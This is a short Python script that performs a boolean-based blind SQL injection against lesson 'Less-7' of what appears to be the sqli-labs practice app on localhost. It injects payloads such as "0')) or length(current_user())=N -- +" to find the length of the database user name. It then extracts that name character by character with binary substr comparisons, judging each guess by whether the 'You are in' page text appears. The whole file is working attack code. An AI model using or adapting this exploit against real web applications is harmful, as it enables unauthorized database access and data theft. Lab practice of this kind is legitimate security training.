import requests


url="http://localhost:8001"
lesson = "/Less-7/"

url = url + lesson

info = "(current_user())"

query = "length(" + info + ")="
end = " -- +"

for i in range(1000):
    params={'id':"0'))" + " or " + query + str(i) + end}
    r = requests.get(url,params)
    #print(r.url)
    if "You are in" in r.text:
        tmp1 = i
        break

returnval = ""
query = "binary substr(" + info + ","
try:
    if(tmp1>0):
        print("it is working!")
except NameError:
    print("something wrong with query")
    exit()
for i in range(1,tmp1 + 1):
    for j in range(48,123):
        params = {'id':"0'))" + " or " + query + str(i) + ",1)='" + chr(j) + "'" + end}
        r = requests.get(url,params)
        #print(r.url)
        if "You are in" in r.text:
            returnval += chr(j)
            break

    
print(returnval)